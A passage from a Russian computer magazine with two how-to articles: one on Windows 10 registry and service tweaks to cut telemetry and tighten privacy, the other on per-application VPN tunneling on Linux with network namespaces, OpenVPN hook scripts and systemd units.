Кортана сильно интегрирова на в систему. Она связана со службой поиска,
политиками приватности и так далее. Поэтому записей о ней в реестре мно‐
го, и с каждым билдом Windows 10 их ста новится все больше.
  После «разблокировки» реестра любой ключ легко менять через regedit.
Когда их много, удоб нее соз дать бат ник и поменять их все скопом из кон‐
соли.


reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v
"AllowCortana" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Experience\
AllowCortana" /v "value" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v
"CortanaEnabled" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v
"CortanaEnabled" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v
"CanCortanaBeEnabled" /t REG_DWORD /d 0 /f




                                     Продолжение статьи →
PCZONE              ← НАЧАЛО СТАТЬИ
  ПРОКАЧАЙ ДЕСЯТКУ!
                      НАСТРАИВАЕМ WINDOWS 10
         ДЛЯ БЕЗОПАСНОЙ И КОМФОРТНОЙ РАБОТЫ





ОТКЛЮЧАЕМ СБОР ДАННЫХ
Под видом сбора «диагностических» данных Windows 10 передает в Microsoft
гигабайты данных, среди которых могут ока зать ся и конфиденциальные.
По сути это что‐то вроде встро енного кей логгера.
   Чтобы избавиться от этой пакос ти, сначала останавливаем фоновые служ‐
бы. Это можно сделать через оснастку services.msc или прямо из консоли.


net stop DiagTrack





               Останавливаем службу телеметрии


sc config DiagTrack start=disabled





              Отклю чаем автостарт службы телеметрии


net stop dmwappushservice
sc config dmwappushservice start=disabled





       Изменяем любые ключи реес тра через консоль или regedit

Далее по аналогии останавливаем службы и запрещаем их автозапуск:
 • diagnosticshub.standardcollector.service;
 • DcpSvc;
 • WerSvc;
 • PcaSvc;
 • DoSvc;
 • WMPNetworkSvc.

Список служб всегда подбирается индивидуально, но в первую оче редь мы
последовательно отключаем:
 • DiagTrack (служба отправки «диагностических» данных);
 • Diagnostics Hub Standard Collector (служба сборщика центра «диагности‐
   ки» Microsoft);
 • dmwappushservice (служба маршрутизации push‐сообщений WAP).

Теперь пора править реестр.


reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v
AllowTelemetry /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\diagnosticshub.standa
rdcollector.service" /v "Start" /t REG_DWORD /d 4 /f
reg add "HKCU\SOFTWARE\Microsoft\Personalization\Settings" /v "Accept
edPrivacyPolicy" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\ControlSet001\Control\WMI\AutoLogger\AutoLo
gger‐Diagtrack‐Listener" /v "Start" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger\AutoLo
gger‐Diagtrack‐Listener" /v "Start" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger\SQMLog
ger" /v "Start" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v
"AITEnable" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v
"DisableUAR" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "Restri
ctImplicitInkCollection" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Microsoft\InputPersonalization" /v "Restri
ctImplicitTextCollection" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Microsoft\InputPersonalization\Traine
dDataStore" /v "HarvestContacts" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\TabletPC" /v
"PreventHandwritingDataSharing" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\HandwritingErro
rReports" /v "PreventHandwritingErrorReports" /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Policies\Microsoft\SQMClient\Windows" /v
"CEIPEnable" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\SQMClient" /v "Corpor
ateSQMURL" /t REG_SZ /d "0.0.0.0" /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\Office\16.0\osm" /v "Enable
logging" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\Office\16.0\osm" /v "Enable
Upload" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\MediaPlayer\Preferences" /v "UsageT
racking" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "NumberOfSIUFInP
eriod" /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "PeriodInNanoSeconds"
 /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v
"DoNotShowFeedbackNotifications" /t REG_DWORD /d 1 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\Assistance\Client\1.0" /v
"NoExplicitFeedback" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Input\TIPC" /v "Enabled" /t REG_DW
ORD /d 0 /f
reg add "HKCU\SOFTWARE\Microsoft\Input\TIPC" /v "Enabled" /t REG_DW
ORD /d 0 /f

Просто сохрани все в виде скрипта (.bat или .cmd) и закомментируй те стро‐
ки, которые считаешь лишними на конкретном компь юте ре.


        WWW

                      Если хочешь узнать больше о шпионских замаш‐
                         ках Windows 10, прочти эти статьи:
                      •Тайная жизнь Windows  10. О чем Windows
                       10 стучит в Microsoft и как заставить ее прек‐
                          ратить
                   •Обзор Windows 10 Anniversary Update: снова
                           отучаем «десятку» сле дить и шпионить



ОТКЛЮЧАЕМ НЕБЕЗОПАСНЫЕ СЕРВИСЫ
Лю бой сервис теоретически небезопасен, но есть известный перечень
служб, которые оставляют в Windows 10 зияющие дыры. Остановить и отклю‐
чить их автозагрузку можно также через net stop и sc config. Я просто
перечислю их здесь, чтобы не перег ружать статью командами с повторя‐
ющимся синтаксисом:
 • RemoteRegistry;
 • TermService;
 • TrkWks;
 • DPS.

Если ты используешь Windows 10 на компьюте ре, то лучше отключить и бес‐
полезный сбор информа ции с датчиков мобильных устройств:
 • SensorDataService;
 • SensorService;
 • SensrSvc.

Если не пользуешься Xbox, то стоит отключить и связанные с Xbox сервисы:
 • XblAuthManager;
 • XblGameSave;
 • XboxNetApiSvc.

Опционально через реестр отключаем удален ного помощника:


reg add "HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance" /v
"fAllowToGetHelp" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance" /v
"fAllowFullControl" /t REG_DWORD /d 0 /f

При необходимости отключаем администра тив ные шары.


reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parame
ters" /v "AutoShareWks" /t REG_DWORD /d 0 /f


ЗАДАЕМ АВТОМАТИЧЕСКУЮ ОЧИСТКУ ФАЙЛА ПОДКАЧКИ
Во избежание утечки паролей и про чих конфиденциальных данных лучше
регулярно очищать файл подкачки при перезагрузке и выключении.


reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\
Memory Management" /v " ClearPageFileAtShutdown " /t REG_DWORD /d 1 /
f


ОТКЛЮЧАЕМ АВТОЗАПУСК СО СМЕННЫХ НОСИТЕЛЕЙ
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\
Explorer" /v "NoDriveTypeAutoRun" /t REG_DWORD /d 255 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\
Explorer" /v "NoAutorun" /t REG_DWORD /d 1 /f


СТИРАЕМ ИСТОРИЮ
Отключаем сохранение списков последних открытых файлов:


reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v
"ShowRecent" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\FileHistory" /v
"Disabled" /t REG_DWORD /d 1 /f

Отключаем ведение истории поисковых запросов:


reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v
"DeviceHistoryEnabled" /t REG_DWORD /d 0 /f

Отключаем историю для приложений:


reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy" /v
"LetAppsAccessCallHistory" /t REG_DWORD


УДАЛЯЕМ ПРЕДУСТАНОВЛЕННЫЕ ПРИЛОЖЕНИЯ
Удаление встро енных компонентов в Windows 10 не всегда происходит оче‐
видным образом, но любая задача реша ется через консоль. Сначала мы при‐
биваем процесс ненужного нам приложения, а затем деинстал лируем его.
На примере OneDrive это выглядит так:


taskkill /f /im OneDrive.exe
start %SystemRoot%\System32\OneDriveSetup.exe /uninstall





                         Уда ляем OneDrive


НАСТРАИВАЕМ АВТОМАТИЧЕСКОЕ СОЗДАНИЕ ТОЧЕК
ВОССТАНОВЛЕНИЯ
Точки восстанов ления удобно соз давать автоматически при помощи утилиты
командной строки WMI (Windows Management Instrumentation).
  Просто настрой восстановление системы один раз, а затем создай бат‐
ник, в котором будет следующая строка:


Wmic.exe /Namespace:\\root\default Path SystemRestore Call Create
RestorePoint "%DATE%", 100, 1

Повесь его в планировщик заданий, и он будет запускаться по указанному
расписанию и автоматичес ки соз давать новые точки вос становления сог‐
ласно настройкам, заданным тобой на первом эта пе.


РЕЖИМ БОГА (ДЕЛАЕМ БЫСТРЫЙ ВЫЗОВ ЛЮБЫХ НАСТРОЕК)
Настройки многих параметров Windows 10 упря таны так глубоко, что лазить
по графическим меню можно полдня. Гораз до удобнее вызывать их все
одним кликом через единственный ярлык. Такой при ем получил название
«режим бога» и выполняется элементарно: дос таточно из‐под админа соз‐
дать на рабочем столе новую папку с именем


НапишиЗдесьЧтоУгодно.{ED7BA470‐8E54‐465E‐825C‐99712043E01C}

Это всё!





                   Добавляем «режим бога»

После нажатия на Enter значок папки изменится на системный и его имя скро‐
ется. При клике на него загрузится спи сок из более чем двухсот настроек
в алфавитном порядке. Красота!


ОТКЛЮЧАЕМ АВТООБНОВЛЕНИЯ
Избавить Windows от привычки загружать и ставить обновления, когда взду‐
мается системе, а не тебе, тоже можно через реестр.


reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\
WindowsUpdate\AU" /v " AUOptions" /t REG_DWORD /d 2 /f

После этого остается воз можность получать апдейты вручную.


reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Curren
tVersion\DeliveryOptimization\Config" /v "DODownloadMode" /t REG_DW
ORD /d 0 /f





                     Автооб новление отключено


УБИРАЕМ ИЗ ПЛАНИРОВЩИКА ЗАПЛАНИРОВАННЫЕ ЗАДАЧИ
ТЕЛЕМЕТРИИ
Они состоят из секций «Клиентский опыт», «Облачный опыт», «Статистика
приложений», «Файловая статистика», «Диагности ка диска», «Диагностика
энергоэффективности», «Монитор семейной безопасности», «Сбор све дений
о сети» и множества других.
  Все они доступны через консольную команду schtasks, которую сперва
нужно запустить с клю чом end для оста новки задачи. Затем повторно запус‐
каем уже с ключом change, ука зав пос ле tn (task name) соот ветствующее наз‐
вание.
  К примеру, команда


schtasks /end /tn "\Microsoft\Windows\FileHistory\File History (
maintenance mode)"

завершит задачу «Сбор ста тистики использования файлов», а сле дующая
команда отключит ее:


schtasks /change /tn "\Microsoft\Windows\FileHistory\File History (
maintenance mode)" /disable

Вот список остальных задач телеметрии:
 • Microsoft\Windows\AppID\SmartScreenSpeciﬁc
 • Microsoft\Windows\Application Experience\AitAgent
 • Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser
 • Microsoft\Windows\Application Experience\ProgramDataUpdater
 • Microsoft\Windows\Application Experience\StartupAppTask
 • Microsoft\Windows\Autochk\Proxy
 • Microsoft\Windows\CloudExperienceHost\CreateObjectTask
 • Microsoft\Windows\Customer Experience Improvement Program\Consolidator
 • Microsoft\Windows\Customer Experience Improvement Program\BthSQM
 • Microsoft\Windows\Customer Experience Improvement
   Program\KernelCeipTask
 • Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
 • Microsoft\Windows\Customer Experience Improvement Program\Uploader
 • Microsoft\Windows\DiskDiagnostic\Microsoft‐Windows‐
   DiskDiagnosticDataCollector
 • Microsoft\Windows\DiskDiagnostic\Microsoft‐Windows‐
   DiskDiagnosticResolver
 • Microsoft\Windows\DiskFootprint\Diagnostics
 • Microsoft\Windows\FileHistory\File History (maintenance mode)
 • Microsoft\Windows\Maintenance\WinSAT
 • Microsoft\Windows\NetTrace\GatherNetworkInfo
 • Microsoft\Windows\PI\Sqm‐Tasks
 • Microsoft\Windows\Power Eﬃciency Diagnostics\AnalyzeSystem
 • Microsoft\Windows\Shell\FamilySafetyMonitor
 • Microsoft\Windows\Shell\FamilySafetyRefresh
 • Microsoft\Windows\Shell\FamilySafetyUpload
 • Microsoft\Windows\Windows Error Reporting\QueueReporting


ЗАКЛЮЧЕНИЕ
В интернете ты найдешь массу прог рамм, авторы которых обещают «улуч‐
шить работу Windows». Обычно они действу ют по принципу черного ящика,
выпол няя неведомые действия. Все их функции можно заменить набором
батников, создание которых описано в этой статье.
  При создании собственного набора скриптов придется немного помучать‐
ся, но только один раз. Дальше все будет выполняться по расписанию (через
планировщик) или по запросу в один клик.
   Главное — ты всегда будешь знать наверняка, что именно изменяется
в реестре и работе системных служб. Заодно, работая в консоли, ты углубишь
свои знания о Windows 10 и смо жешь выполнять ана логичные задачи голыми
руками где угодно.


        WWW

                       •Simple System Tweaker
                      •Advanced System Tweaker
                         •Optimizer
                     •Сведения о реестре
PCZONE VPN
    НЕ ДЛЯ ВСЕХ

                ТУННЕЛИРУЕМ ТРАФИК
             ОТДЕЛЬНЫХ ПРИЛОЖЕНИЙ
                     С ПОМОЩЬЮ
              LINUX NETWORK NAMESPACES





                                                                                               eakj





VPN — это замеча тельная штука, которая повышает твою
анонимность и безопасность. Но постоянно сидеть под VPN
может   быть   неудобно:   хочешь,   например,   зайти
в интернет‐банк со своего реального IP, но на закачке стоит
пара новых эпизодов любимого сериала. В Linux можно
решить эту проблему при помощи механизма network name‐
spaces и туннелировать тра фик отдельных при ложений. Сей‐
час я покажу, как это сделать.


НЕМНОГО О LINUX NAMESPACES
В Linux реализована функция пространс тва имен (namespace), которая отве‐
чает за изоляцию разных ресурсов системы. Она вовсю применяется в про‐
ектах контейнеризации, например таких как Docker. Существует нес колько
типов пространств имен: pid, net, mnt, user, uts, ipc.
  Нас интересует пространс тво имен для сетей (netns), которое изолирует
сетевые ресурсы. Для каждого netns можно назначать: свои интерфейсы,
наборы IP‐адресов и портов (сокеты), таблицы маршрутизации, правила фай‐
рвола и так далее. Есть воз можность перемещать интерфейсы из одного
netns в другой. Физический интерфейс (например, eth0) может находиться
одновременно только в одном netns.
  Изначально все интерфейсы и процессы содержатся в исходном (initial)
netns, у него нет конкретного имени, и он не отоб ражается в списке. После
освобождения какого‐либо netns все физические интерфейсы, которые
были в нем, возвращают ся в initial netns. Освобождение происходит после
завершения последнего процес са в этом netns. Например, даже если удалить
конкретный netns, но процесс, запущенный в нем, будет активным, физичес‐
кий интерфейс не перенесет ся обратно в исходный netns до тех пор, пока
процесс не будет завершен. Рассмотрим этот вари ант позже.


ВВЕДЕНИЕ В КУРС
Именно netns поможет нам в туннелиро вании трафика отдельных приложе‐
ний. Для начала нужно немного разобраться в командах управления.


База netns
За контроль netns отвечает утилита ip из пакета iproute2. Для соеди нения
netns между собой можно использовать пару виртуальных интерфейсов veth.
Рассмотрим пример соз дания нескольких netns и их соединения. Для этого
выпол ним


$ sudo ip netns add ns_1
$ sudo ip netns add ns_2

Наличие этих netns смотри командой ip netns list или прос то ip netns,
так  как list — действие по умолчанию. Добавим виртуальную пару
при помощи команды


$ sudo ip link add dev virt01 type veth peer name virt02





                 Управление netns и veth с помощью ip

Интерфейсы  добавились,  теперь  перемес тим  virt01  в  netns  ns_1,
а virt02 — в ns_2.


$ sudo ip link set virt01 netns ns_1
$ sudo ip link set virt02 netns ns_2

Если не появилось сообщений об ошиб ках, зна чит, все прошло успешно.
Для выполнения команды внут ри netns используется команда


$ sudo ip netns exec <имя netns> <команда для выполнения>

Например, посмотреть список дос тупных интерфейсов внутри netns ns_1
можно при помощи


$ sudo ip netns exec ns_1 ip link

Почитав man,  узнаем,  что выполнять команды ip  внутри  netns можно
при помощи $ sudo ip ‐n <имя netns>, а зна чит, $ sudo ip netns exec
ns_1 ip link заменяем на $ sudo ip ‐n ns_1 link.





       Удостоверимся, что интерфейсы перенес лись в нужные netns

По умолчанию интерфейсы, соз данные или перемещенные в netns, пребыва‐
ют в отключенном состоянии, даже lo.
  Добавим нашим интерфейсам virt01 и virt02 по IP‐адресу и переведем
их в состояние UP. Для этого вос пользуемся «прокачанной» командой, под‐
смотренной в man:


$ sudo ip ‐n ns_1 addr add 10.0.0.1/24 dev virt01
$ sudo ip ‐n ns_2 addr add 10.0.0.2/24 dev virt02
$ sudo ip ‐n ns_1 link set dev virt01 up
$ sudo ip ‐n ns_2 link set dev virt02 up
$ sudo ip ‐n ns_1 addr show
$ sudo ip ‐n ns_2 addr show





             Соединяем вмес те нашу вир туальную пару

Как я уже говорил, у каж дой netns своя таб лица маршру тизации, проверим
это.





                Действитель но, таблицы отличаются

Для проверки связи между ns_1 и ns_2 вос поль зуемся командой ping.


$ sudo ip netns exec ns_1 ping ‐c 4 10.0.0.2





               Соединение уста новлено успешно

Как ты помнишь, адрес 10.0.0.2 принадлежит интерфейсу virt02, который
находится в ns_2. Похожим спо собом netns соединяют с физическим eth0.


Вы пол нение команд и запуск про цессов внутри netns
Как ты помнишь, команды внутри netns выполняются при помощи


$ sudo ip netns exec <имя netns> <команда>

Чтобы не писать все это каждый раз, запустим bash!


$ sudo ip netns exec ns_1 bash

После этого все команды будут исполнять ся внутри netns — заод но и про‐
верим ситуацию с файрволом. Что бы вернуться, пиши exit или CTRL + D.





                      Список правил пуст

У меня всегда присутствуют правила в фай рволе, так что это точно отдельный
набор. ;)
  Перейдем к примеру с воз вра щением физического интерфейса в initial
netns. Для этого проверим текущее расположение enp0s3 и перенесем его
в ns_2.


$ sudo ip link set dev enp0s3 netns ns_2





                Как видно, enp0s3 больше нет в init netns

Поднимем его в netns ns_2 и запустим WireShark от имени пользовате ля (eakj)
там же.


$ sudo ip ‐n ns_2 link set dev enp0s3 up
$ sudo ip ‐n ns_2 link
$ sudo ip netns exec ns_2 sudo ‐u eakj wireshark 2>/dev/null &





                      WireShark запущен в netns ns_2

Теперь удалим netns ns_2 и пос мотрим, вернется ли enp0s3 в initial netns:


$ sudo ip netns del ns_2





  enp0s3 не освободится, пока процесс WireShark не будет завершен,
  даже несмотря на удаление ns_2

Закроем WireShark и пос мотрим, даст ли это резуль тат.





       После завершения процесса enp0s3 вернулся в initial netns

Этого должно быть достаточно, что бы понять, как работают netns и как ими
управлять. Перейдем к OpenVPN.


РАЗБИРАЕМСЯ С OPENVPN
Не так давно я писал о том, как поднять собс твен ный OpenVPN на арендован‐
ном сервере. Если ты следовал гайду, то у тебя уже настроен клиентский
файл, который можно использовать. Конфигура ционные файлы других VPN‐
провайдеров тоже подойдут, так как никаких изменений на сервере делать
не придется.


Из менение клиентско го кон фига
Познакомимся с новыми директивами OpenVPN.
 1. ifconfignoexec — запрещает клиенту авто матическое выполнение
  ifconfig для добавления IP‐адреса интерфейсу tun. Вместо этого
   передаст нужные параметры в качестве переменных окружения.
 2. routenoexec — та же ситуация, что и с ifconfignoexec, только
   вместо IP он не будет добавлять маршруты. Необходимые параметры
   передадутся.
 3. routeup /полный/путь/к/скрипту отпра вит на скрипт переменной
   окружения $script_type строку routeup.
 4. up  /полный/путь/к/скрипту —  то  же,  что и routeup, только
   передаст строку up после поднятия интерфейса tun/tap. Выполняется до
   директивы user, которая дол жна понизить наши при вилегии.
 5. down /полный/путь/к/скрипту — то же, что и routeup, только стро‐
   ку down, после удаления интерфейса tun/tap. Выполняется после дирек‐
   тивы user!
 6. scriptsecurity 2 позволит исполнять кас томные скрипты.

Полный список переда ваемых переменных окружения можно посмотреть
в man openvpn, секция Environmental Variables.
  Надеюсь, ты обратил внимание на жир ный шрифт. Директива up добавит
наш netns, down — удалит. Для добавления и уда ления netns нужны права
рута. Это не проб лема в случае с up, пос кольку она исполняется перед user,
а та, в свою очередь, понижает пра ва до nobody. А вот с down явно будут
проблемы, так как пользователь nobody не смо жет удалить netns. Поэтому
первым делом в клиентском конфиге закомментируй или удали строчки


user nobody
group nobody

и добавь новые директивы. Пример немного измененного скрипта из прош‐
лой статьи:


openvpn_client.conf
client
dev tun
proto tcp
remote 127.0.0.1 1194
resolv‐retry infinite
nobind
#user nobody
#group nobody
persist‐key
persist‐tun
ca /etc/openvpn/client/ca.crt
cert /etc/openvpn/client/openvpn‐client.crt
key /etc/openvpn/client/openvpn‐client.key
### на клиенте 1
tls‐auth /etc/openvpn/client/ta.key 1
remote‐cert‐tls server
cipher AES‐256‐GCM
verb 3
script‐security 2
ifconfig‐noexec
route‐noexec
up "/etc/openvpn/client/ovpn_control.sh"
route‐up "/etc/openvpn/client/ovpn_control.sh"
down "/etc/openvpn/client/ovpn_control.sh"

где ovpn_control.sh — скрипт, который будет обрабатывать директивы.
   Теперь нужен resolv.conf для netns. Он хранится в /etc/netns/<имя
netns>/resolv.conf, поэто му создадим директорию:


$ sudo mkdir ‐p /etc/netns/<имя netns>

В нашем случае имя — это ovpn. При выпол нении скрипта в resolv.conf
запишутся DNS‐серверы. Если netns не смо жет найти /etc/netns/ovpn/
resolv.conf, то обратится к /etc/resolv.conf. Поэтому убедись, что там
публичные серверы, так как DNS‐запросы идут через туннель и адрес твоего
роутера может не найтись на стороне сервера. :)
  Пример скрипта — ниже. Можешь заменить в нем DNS1 и DNS2 на свои
любимые.


ovpn_control.sh
#!/usr/bin/bash
DNS1=208.67.222.222
DNS2=208.67.220.220
case $script_type in
    up)
        /usr/sbin/ip netns add ovpn
        /usr/sbin/ip link set $dev netns ovpn
        /usr/sbin/ip ‐n ovpn address add $ifconfig_local/30 dev $dev
        /usr/sbin/ip ‐n ovpn link set $dev up mtu $tun_mtu
        [ ! ‐d /etc/netns/ovpn ] && mkdir ‐p /etc/netns/ovpn
        echo "nameserver $DNS1" > /etc/netns/ovpn/resolv.conf
        echo "nameserver $DNS2" >> /etc/netns/ovpn/resolv.conf
        ;;
    route‐up)
        /usr/sbin/ip ‐n ovpn route add default dev $dev
        ;;
    down)
        /usr/sbin/ip netns del ovpn
        ;;
esac




                                     Продолжение статьи →
PCZONE              ← НАЧАЛО СТАТЬИ
    VPN        НЕ ДЛЯ ВСЕХ
                          ТУННЕЛИРУЕМ ТРАФИК
            ОТДЕЛЬНЫХ ПРИЛОЖЕНИЙ С ПОМОЩЬЮ
                          LINUX NETWORK NAMESPACES





Управле ние клиентом
В прошлой статье для управления клиентом использовались только файлы
с расширением .service для systemd. Сейчас рас смотрим и другой вари‐
ант: управление при помощи скрипта. Пригодится тем, у кого дис трибутив
без systemd.


Пишем скрипт
Ниже приведу свой скрипт и в двух сло вах объясню, что он делает.
 1. Принимает на стандартный вход первым аргу ментом ($1 ) одну из строк:
  start, stop, restart или exec.
 2. В соответствии со стро кой выполняет одну из функций:

    • если start, то в фоновом режиме запускает openvpn с конфигом,
     который приведен ниже, а также пишет лог в /tmp/ovpn_log.txt;
    • если stop, то процесс openvpn прекращается сигналом SIGTERM
        (kill 15 или прос то kill). Это дает openvpn воз можность обра‐
      ботать его и пос лать переменной окру жения $script_type строку
     down в другой скрипт (см. выше). Номер процесса берется из PID‐фай‐
      ла. Также стоит заг лушка для случая с логаутом. Детали — ниже;
    • restart запускает сна чала stop, потом start;
    • exec в netns выполняет от имени пользователя все, что передано пос‐
     ле него.


             INFO

                    При завершении сессии система, видимо, уби‐
                        вает процессы сигналом SIGKILL (kill ‐9),
                      и у OpenVPN уже нет шансов послать скрипту
                      коман ду down и, соответственно, удалить netns.
                      Если ты будешь делать логаут с запущенным
                     OpenVPN, то после захода обратно netns может
                      быть поднят, но интерфейса tun уже не будет.
                   В этом случае нужно будет выполнить

                     $ sudo ./openvpn_netns.sh restart


Далее — сам скрипт. Подправь x_user, conf_file, log_file, pid_file,
netns_name, как тебе понравится.


openvpn_netns.sh
#!/usr/bin/bash
x_user=eakj
conf_file=/etc/openvpn/client/openvpn_client.conf
log_file=/tmp/ovpn_log.txt
pid_file=/var/run/ovpn.pid
netns_name=ovpn
die() {
    printf "%s\n" "$@"
    exit 1
}
usage() {
    printf "%s\n\t%s\n" "USAGE:" "$0 start|stop|restart|exec"
    exit 1
}
start_() {
    [ ‐f /var/run/netns/$netns_name ] && die "[E:] netns $netns_name
is already up. If it shouldn't be, try restart"
    if [ ‐f "$conf_file" ]; then
        printf "%s\n" "[S:] starting with $conf_file"
        openvpn ‐‐writepid "$pid_file" ‐‐log "$log_file" ‐‐config "
$conf_file" &>/dev/null &
    else
        die "[E:] $conf_file not found"
    fi
}
stop_() {
    if [ ‐f "$pid_file" ]; then
        _PID=$(cat "$pid_file")
        ## PID‐файл нашли, теперь проверим, существует ли процесс
        ## с номером, указанным в файле
        if ps ‐ef | grep "$_PID" | grep ‐v grep &>/dev/null; then
            printf "%s\n" "[S:] stopping openvpn process with PID
$_PID"
            kill $_PID
        else
            printf "%s\n" "[E:] $pid_file file exists, but actual
process id not found"
        fi
        [ ‐f "$log_file" ] && rm ‐f "$log_file" &>/dev/null
        [ ‐f "$pid_file" ] && rm ‐f "$pid_file" &>/dev/null
    fi
    ## netns может остаться, если ты разлогинился с включенным
OpenVPN.
    ## Проверим, существует ли процесс, но уже не по PID‐файлу
    ## (его может не быть), а спарсим название конфиг‐файла,
    ## с которым он должен был быть запущен.
    ## Если процесс не найден, но netns каким‐то чудом существует,
    ## скорей всего, OpenVPN был убит ‐9 сигналом
    if ! ps ‐ef | grep ‐iE "openvpn.+$(basename $conf_file)$" &>/dev/
null && [ ‐f "/var/run/netns/$netns_name" ]; then
        ip netns del $netns_name
        die "[W:] probably openvpn was killed with SIGKILL, deleting
$netns_name netns"
    fi
}
(( $UID != 0 )) && die "[E:] must run as root"
(( $# < 1 )) && usage
case "$1" in
    start)
        start_
        ;;
    stop)
        stop_
        ;;
    restart)
        "$0" stop
        sleep 5
        "$0" start
        ;;
    exec)
        shift
        ip netns exec $netns_name sudo ‐u $x_user "$@"
        ;;
    *)
        usage
        ;;
esac

Рассмотрим примеры использования. Подклю чимся к серверу, проверим
наличие netns и выполним несколько команд. Если не соз дается netns, то
смотри /tmp/ovpn_log.txt, подсказка, скорее всего, там.


$ sudo ./openvpn_netns.sh start
$ ip netns
$ sudo ./openvpn_netns.sh exec ping ‐c 4 8.8.8.8
$ sudo ./openvpn_netns.sh exec curl ifconfig.co
$ sudo ./openvpn_netns.sh exec firefox &>/dev/null &





                         Firefox успешно запус тился в netns

Кстати, будь внимателен при выполнении команд от рута и переводе их
в фоновый режим (& в кон це команды). В этом случае команда сработала
без проблем, так как я недавно вводил пароль. Если бы прошло больше вре‐
мени и я бы попытался запус тить таким образом firefox, то в итоге
в фоновый режим ушел бы запрос от sudo ввести пароль. Пришлось бы поль‐
зоваться командами bg, fg и CTRL‐Z. Чтобы упростить себе жизнь, добавь
следующую строчку в /etc/sudoers, где eakj — имя пользователя, конечно.


eakj ALL=NOPASSWD:/путь/к/openvpn_netns.sh

Это позволит выпол нять скрипт с помощью sudo, не запрашивая пароля.
  Пробуем остановить openvpn и удалить netns.


$ sudo ./openvpn_netns.sh stop
$ ip netns




              Остановка OpenVPN и netns успешна


Файлы .service для systemd
В качестве шаблона я брал файлы .service из блога Остина Адамса. Прис‐
тупим к модификации.
  Для начала нужно создать директорию /etc/systemd/system/openvpn‐
client@.service.d/ и записать туда netns.conf. Опять же, в Ubuntu это,
скорее всего, будет просто /etc/systemd/system/openvpn@.service.d/.


$ sudo mkdir /etc/systemd/system/openvpn‐client@.service.d/
$ sudo tee /etc/systemd/system/openvpn‐client@.service.d/netns.conf <
< EOF
[Unit]
Requires=netns@%i.service
After=netns@%i.service
[Service]
# Needed to call setns() as ip netns does
CapabilityBoundingSet=CAP_SYS_ADMIN
EOF

Теперь создадим файл netns@.service в /etc/systemd/system/. Благода‐
ря конфигу, который добавили ранее, этот сервис будет стартовать после
первого запуска systemctl  start  openvpn‐client@openvpn‐client.
conf. Он создаст netns с таким же именем, как и конфиг для OpenVPN.


$ sudo tee /etc/systemd/system/netns@.service << EOF
[Unit]
Description=network namespace %I
[Service]
Type=oneshot
ExecStart=/usr/sbin/ip netns add %I
ExecStop=/usr/sbin/ip netns del %I
RemainAfterExit=yes
EOF

Посмотреть статус мож но при помощи команды


$ systemctl status netns@openvpn_client

А убедиться в том, что он создал netns, — командой $ ip netns. Также тут
есть один нюанс: после остановки сервиса openvpn командой


$ sudo systemctl stop openvpn‐client@openvpn_client.conf

сервис netns@openvpn_client не остановится, а значит, и netns продол жит
жить.
   Также придется немного подпра вить ovpn_control.sh.
 1. Добавить распознавание имени конфиг‐файлов.
 2. Убрать строчку создания netns, так как это уже будет делать netns@.ser
  vice.
 3. Поскольку имя netns теперь зависит от имени клиентского конфига Open‐
   VPN, нужно создавать новые директории для resolv.conf.
 4. Удалить down, так как systemd его все равно не вызывает.


#!/usr/bin/bash
DNS1=208.67.222.222
DNS2=208.67.220.220
basename="$(basename "$config")"
ns="${basename%.conf}"
case $script_type in
    up)
        /usr/sbin/ip link set $dev netns $ns
